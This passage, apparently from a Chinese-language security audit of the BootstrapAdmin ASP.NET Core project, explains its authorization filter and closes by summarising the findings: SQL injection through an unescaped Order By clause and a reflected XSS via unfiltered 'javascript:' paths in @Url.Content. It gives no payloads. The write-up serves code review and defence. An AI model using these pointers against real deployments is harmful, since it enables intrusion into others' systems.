跟进 `BootstrapAdminAuthorizeFilter`类可以看到`OnAuthorizationAsync`，这方个法适用于控制器和 Razor 页面等需要进行授权检查的请求。
![image.png](../../images/posts/04ed0410f79227bdf6d9940bc1463b75.png)
> context.Request.Path 是一个属性，它返回一个 PathString 对象，代表请求 URL 的路径部分。PathString 对象是一个不可变类型，用于存储 URL 路径。PathString 的值形式如下所示：
> `/Controller/Action/ID`
> 其中，/Controller 是控制器的名称，/Action 是控制器的方法名，/ID 是可选的参数，用于标识要处理的特定资源。在 ASP.NET Core 应用程序中，PathString 对象用于匹配路由模板，以确定要执行哪个控制器方法。可以使用 context.Request.Path.ToString() 方法获取 PathString 对象的字符串表示形式，以便在日志或调试信息中使用。

这里做了两个判断：

1. 查询判断了当前请求是否需要进行授权检查。如果当前请求标记为允许匿名访问，或者是一个 Razor 页面并且该页面已配置为匿名，或者当前用户拥有 Administrators 角色，则该请求无需进行授权检查，并允许请求通过。
2. 通过调用 AuthenticationExtensions.RetrieveRolesByUrl 方法获取当前 URL 具有的角色集合，判断当前用户的角色是否是集合中的一个。

通过后即可访问控制器方法。
# 0x05 后语
在本篇文章中可以看到，我们注重了文件IO操作、SQL ORM操作、权限校验、XSS漏洞。
测试SQL注入时，ORM使用了PetaPoco并且运用了Linq对用户输入的内容进行转义，尽管使用`@0`方式很安全，但在`Order By`处不能转义。这是老生常谈了。开发人员没有针对性的过滤导致漏洞的产生。
测试XSS时，开发者使用了Razor Pages，在 Razor 视图中，默认情况下会进行 HTML 实体编码。可尽管严防死守，还是避免不了使用`@Url.Content`，没有针对`javascript:`这样的请求路径进行过滤。除此之外，还有在页面中使用`html(text)`函数输出的情况，只不过我测试时发现大部分无法有效利用，并且使用了`$.safeHtml()`函数所以仅列出了一个前台反射型XSS。
测试权限校验时显示观察了带有`[AllowAnonymous]`标签的类和方法，后面才是根据`Startup.cs`查看了过滤器和中间件，并根据开发者提供的[Bootstrap.Security.Mvc](https://gitee.com/LongbowEnterprise/BootstrapAdmin/wikis/%E9%A1%B9%E7%9B%AE%E4%BE%9D%E8%B5%96/Bootstrap.Security.Mvc)进行了审计。
总而言之，无论是使用什么语言开发都要按照标准进行，我们代码审计时更加需要细心和多一些耐心。
